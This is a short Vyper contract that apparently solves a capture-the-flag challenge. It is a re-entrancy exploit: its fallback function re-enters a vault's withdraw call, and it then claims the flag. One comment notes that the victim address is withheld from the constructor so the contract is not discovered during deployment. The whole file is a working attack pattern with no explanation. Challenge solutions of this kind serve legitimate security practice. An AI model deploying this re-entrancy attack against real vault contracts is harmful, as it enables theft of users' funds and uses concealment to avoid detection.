# @version >=0.3.2
from vyper.interfaces import ERC20

victimVault: address     # not set in contstructor to avoid discovery during deployment
enough: bool             # to stop re-entrancy recursion

interface CtfVault:
  def deposit(_assets: uint256,_receiver: address)->uint256: payable
  def withdraw(_assets: uint256,_receiver: address,_owner: address)->uint256: nonpayable
  def captureTheFlag(newFlagHolder: address): nonpayable

@external
@payable
def __default__():
  if not self.enough: # just need to re-enter once
    self.enough = True
    CtfVault(self.victimVault).withdraw(0, self, self)  

@external
@payable
def attack(_victimVault: address):
    self.victimVault = _victimVault
    CtfVault(_victimVault).withdraw(0, self, self)  # even 0 wei works to trigger the whole withdrawal call flow!
    CtfVault(self.victimVault).captureTheFlag(msg.sender)

@external
def __init__():
    self.enough = False
